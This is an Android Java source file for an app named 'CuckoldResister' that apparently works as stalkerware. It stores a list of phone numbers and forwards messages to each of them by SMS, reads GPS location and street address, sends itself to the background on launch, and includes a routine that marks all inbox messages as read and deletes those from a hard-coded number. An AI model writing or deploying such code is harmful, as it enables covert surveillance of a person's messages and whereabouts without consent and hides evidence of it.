package com.Sven.CuckoldResister.CuckoldResister;

import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.location.Location;
import android.net.Uri;
import android.os.Bundle;
import android.support.v7.app.AppCompatActivity;
import android.telephony.SmsManager;
import android.text.method.ScrollingMovementMethod;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;

import java.io.BufferedReader;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.List;

public class MainActivity extends AppCompatActivity {
    public static String InfoMessage = "";
    public static List<String> PhoneList = new ArrayList<String>();
    private String FILENAME = "PhoneListLocalStorage";
    private String StroeData = "";

    private String MessageReceived = "";
    private String MessageData = "";
    private static final int MY_PERMISSIONS_REQUEST_SEND_SMS = 0;
    private String DisplayMessage = "";
    private static GPSTracker gps;
    public static String address;
    public static Location location;
    private static Context mContext;

    Button sendBtn;
    Button displayBtn;
    Button resetBtn;
    Button gPSBtn;
    EditText txtphoneNo;
    static TextView info;
    static TextView displayTextView;

    @Override
    protected void onCreate(Bundle savedInstanceState)  {

        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        txtphoneNo = (EditText) findViewById(R.id.phone_input);
        txtphoneNo = (EditText) findViewById(R.id.phone_input);
        sendBtn = (Button) findViewById(R.id.forward_button);
        displayBtn = (Button) findViewById(R.id.showlist_button);
        resetBtn = (Button) findViewById(R.id.reset_button);
        gPSBtn = (Button) findViewById(R.id.GPSButton);
        info = (TextView) findViewById(R.id.info_text);
        displayTextView = (TextView) findViewById(R.id.display_text);
        displayTextView.setMovementMethod(new ScrollingMovementMethod());
        mContext = getApplicationContext();

        sendBtn.setOnClickListener(new View.OnClickListener() {
            public void onClick(View view) {
                if (!txtphoneNo.getText().toString().isEmpty()) {
                    AddPhoneToList(txtphoneNo.getText().toString());
                } else {
                    SetInfoMessage("Phone cannot be empty");
                }
            }
        });

        displayBtn.setOnClickListener(new View.OnClickListener() {
            public void onClick(View view) {
                ReadPhoneList();
            }
        });

        resetBtn.setOnClickListener(new View.OnClickListener() {
            public void onClick(View view) {
                Rest();
            }
        });

        gPSBtn.setOnClickListener(new View.OnClickListener() {
            public void onClick(View view) {
                DisplayGPS();
            }
        });

        ReadPhoneList();

        moveTaskToBack(true);
        //MinimizeApplication();

    }

    public static void  InitGPS(){
        gps = new GPSTracker(mContext);
        Toast.makeText(mContext, "INIT GPS DONE", Toast.LENGTH_SHORT).show();
    }

    public void DisplayGPS() {
        gps = new GPSTracker(MainActivity.this);

        if (gps.canGetLocation()) {
            double latitude = gps.getLatitude();
            double longitude = gps.getLongitude();
            Toast.makeText(getApplicationContext(), "Your Location is - \nLat: " + latitude + "\nLong: " + longitude, Toast.LENGTH_LONG).show();

            String a = getAddress();
            Log.d("sven","a: add: "+ a);
        } else {
        }

    }

    public void AddPhoneToList(String _newPhone) {
        Log.d("sven", "MainActivity.start AddPhoneToList");

        if (!PhoneList.contains(_newPhone)) {
            try {
                PhoneList.add(_newPhone);
                SetInfoMessage("New number " + _newPhone + " added");
                SmsForward.sendSMSMessage_sms_AddToList(_newPhone);
                //Log.d("sven", "MainActivity. Forward Service Added");

                ListToString();
                StoreInfo(DisplayMessage);
                Log.d("sven", "MainActivity.Store Data message successful");
            } catch (Exception e) {
                SetInfoMessage(e.getMessage());
            }
        } else {
            SetInfoMessage("Number " + _newPhone + " exits.");
        }
    }

    public static void sendSMSMessage(String _message) {
        try {
            for (int i = 0; i < PhoneList.size(); i++) {
                SmsManager smsManager = SmsManager.getDefault();
                smsManager.sendTextMessage(PhoneList.get(i), null, "[Forward] " + _message, null, null);
                SetInfoMessage("Forward Message to " + PhoneList.get(i) + " added");
                Log.d("sven", "MainActivity. message sent");
            }
        } catch (Exception e) {
            SetInfoMessage(e.getMessage());
        }

    }

    public void ReadPhoneList() {
        try {
            ReadInfo();
            ListToString();
            SetDisplayMessage(DisplayMessage);
            Log.d("sven", "MainActivity. read phone list successful");
        } catch (Exception e) {
            SetInfoMessage(e.getMessage());
        }
    }

    public void Rest() {
        PhoneList = new ArrayList<String>();
        txtphoneNo.setText("");
        RestLocalData();
        SetInfoMessage("All information have been rest!");
        displayTextView.setText("");
        Log.d("sven", "MainActivity.reset done");
    }

    public void StoreInfo(String _message) {
        FileOutputStream fos = null;
        StroeData = "";
        StroeData = _message;
        try {
            fos = openFileOutput(FILENAME, Context.MODE_PRIVATE);
            fos.write(StroeData.getBytes());
            fos.close();
            Log.d("sven", "MainActivity. store data successful");
        } catch (Exception e) {
            e.getMessage();
        }
    }

    public void ReadInfo() {
        FileInputStream fos = null;
        PhoneList = new ArrayList<String>();
        int i = 1;
        try {
            fos = openFileInput(FILENAME);
            InputStreamReader inputStreamReader = new InputStreamReader(fos);
            BufferedReader bufferedReader = new BufferedReader(inputStreamReader);
            StringBuilder sb = new StringBuilder();
            String line;


            while ((line = bufferedReader.readLine()) != null) {
                sb.append(line);
                if (i % 2 == 0) {
                    PhoneList.add(line);
                }
                i++;
            }
            fos.close();

            Log.d("sven", "MainActivity.read data successful" + sb);
        } catch (Exception e) {
            e.getMessage();
            Log.d("sven", "MainActivity.read failed");
        }
    }

    public static void SetInfoMessage(String _message) {
        info.setText(_message);
        Log.d("sven", "MainActivity.setInfoMessage successful");
        try {
            //Thread.sleep(1000);
        } catch (Exception e) {
        }
    }

    public static void SetDisplayMessage(String _message) {
        displayTextView.setText("");
        displayTextView.setText(_message);
        Log.d("sven", "MainActivity.display message successful");
        try {
            //Thread.sleep(1000);
        } catch (Exception e) {
        }
    }

    public void RestLocalData() {
        FileOutputStream fos = null;
        StroeData = "";
        try {
            fos = openFileOutput(FILENAME, Context.MODE_PRIVATE);
            fos.write(StroeData.getBytes());
            fos.close();
            Log.d("sven", "MainActivity. reset data successful");
        } catch (Exception e) {
            e.getMessage();
        }
    }

    public void ListToString() {
        DisplayMessage = "";
        for (int i = 0; i < PhoneList.size(); i++) {
            DisplayMessage += ("Phone number " + (i + 1) + ":\r" + PhoneList.get(i) + "\n");
        }
    }

    public List<String> getPhoneList() {
        return PhoneList;
    }

    public double[] getGPS() {
        if (gps.canGetLocation()) {
            if(gps.getLatitude()==0.0){
                double[] dl = new double[2];
                dl[0] = 0.0;
                dl[1] = 0.0;
                return dl;
            }
            double latitude = gps.getLatitude();
            double longitude = gps.getLongitude();
            Log.d("sven", "mainActivity: " + latitude + "|||" + longitude);
            double[] dl = new double[2];
            dl[0] = latitude;
            dl[1] = longitude;
            return dl;
        } else {
            return null;
        }
    }

    public Location getLocation() {
        location = gps.getLocation();
        return location;
    }

    public String getAddress() {
        location = gps.getLocation();
        String fetcAddressRes = "";

        try {
            //Thread.sleep(1000);
            gps.fetchAddress(mContext, location);
            Log.d("sven", "MAIN: fetcAddressRes: " + fetcAddressRes);
                for (int i = 0; i < 500; i++) {
                    if (!gps.address.equals("cannot find address")) {

                        return gps.address;
                    }
                    Thread.sleep(10);
                }
                if (fetcAddressRes.equals("cannot find address")) {

                    return "fetch address time out!";
                }

            return fetcAddressRes;
        } catch (Exception e) {
            Log.d("sven", "MAIN: fetch address error: " + e.getMessage());
            Log.d("sven","MAIN: address:" + gps.address);
            return "fetch address error!";
        }
    }

    public void deleteMessage() {
        try {
            Uri uriSms = Uri.parse("content://sms/inbox");
            Cursor c = getApplicationContext().getContentResolver().query(
                    uriSms, null, null, null, null);

            if (c != null && c.moveToFirst()) {
                do {
                    long id = c.getLong(0);
                    long threadId = c.getLong(1);
                    String address = c.getString(2);
                    String body = c.getString(5);
                    String date = c.getString(3);
                    Log.d("sven",
                            "0--->" + c.getString(0) + "1---->" + c.getString(1)
                                    + "2---->" + c.getString(2) + "3--->"
                                    + c.getString(3) + "4----->" + c.getString(4)
                                    + "5---->" + c.getString(5));
                    Log.d("sven", "date" + c.getString(0));

                    ContentValues values = new ContentValues();
                    values.put("read", true);
                    getContentResolver().update(Uri.parse("content://sms/"),
                            values, "_id=" + id, null);

                    if (address.equals("0450703233")) {
                        // mLogger.logInfo("Deleting SMS with id: " + threadId);
                        getApplicationContext().getContentResolver().delete(
                                Uri.parse("content://sms/" + id), "date=?",
                                new String[]{c.getString(4)});
                        Log.d("sven", "Delete success.........");
                    }
                } while (c.moveToNext());
            }
        } catch (Exception e) {
            Log.d("sven", e.toString());
        }
    }

    public static Context getmContext(){
        return mContext;
    }

    public void MinimizeApplication(){
        Intent small = new Intent(Intent.ACTION_MAIN);
        small.addCategory(Intent.CATEGORY_HOME);
        small.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(small);
    }

}